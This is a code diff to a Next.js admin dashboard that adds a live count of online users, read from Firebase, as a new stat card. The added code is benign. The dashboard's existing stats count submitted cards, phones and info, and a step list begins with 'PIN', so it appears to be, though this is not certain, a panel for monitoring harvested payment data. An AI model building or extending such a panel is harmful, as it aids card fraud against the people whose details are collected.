@@ -38,8 +38,27 @@ import { DataField } from "@/components/data-field"
 import { StatCard } from "@/components/stat-card (1)"
 import { onAuthStateChanged } from "firebase/auth"
 import { useRouter } from "next/navigation"
-import { auth } from "@/lib/firestore"
+import { auth, database } from "@/lib/firestore"
 import { Slider } from "@/components/ui/slider"
+import { onValue, ref } from "firebase/database"
+// Custom Hooks
+function useOnlineUsersCount() {
+  const [onlineUsersCount, setOnlineUsersCount] = useState(0)
+
+  useEffect(() => {
+    const onlineUsersRef = ref(database, "status")
+    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
+      const data = snapshot.val()
+      if (data) {
+        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
+        setOnlineUsersCount(onlineCount)
+      }
+    })
+    return () => unsubscribe()
+  }, [])
+
+  return onlineUsersCount
+}
 
 const STEP_NAMES: Record<number | string, string> = {
   1: "PIN",
@@ -65,6 +84,8 @@ export default function AdminDashboard() {
   const [authNumber, setAuthNumber] = useState("")
   const [zoomLevel, setZoomLevel] = useState<number>(0.55)
   const prevApplicationsCount = useRef<number>(0)
+  const onlineUsersCount = useOnlineUsersCount()
+
   const router=useRouter()
   // Authentication
   useEffect(() => {
@@ -311,11 +332,12 @@ export default function AdminDashboard() {
       {/* Stats */}
       <div className="border-b border-border bg-card/50">
         <div className="px-6 py-4">
-          <div className="grid grid-cols-4 gap-3">
+          <div className="grid grid-cols-5 gap-3">
             <StatCard icon={FileText} label="إجمالي الطلبات" value={stats.total} variant="default" />
             <StatCard icon={CreditCard} label="البطاقات" value={stats.cards} variant="success" />
             <StatCard icon={Phone} label="الهواتف" value={stats.phones} variant="warning" />
             <StatCard icon={Info} label="المعلومات" value={stats.info} variant="default" />
+            <StatCard icon={User} label="المتصلين" value={onlineUsersCount} variant="success" />
           </div>
         </div>
       </div>
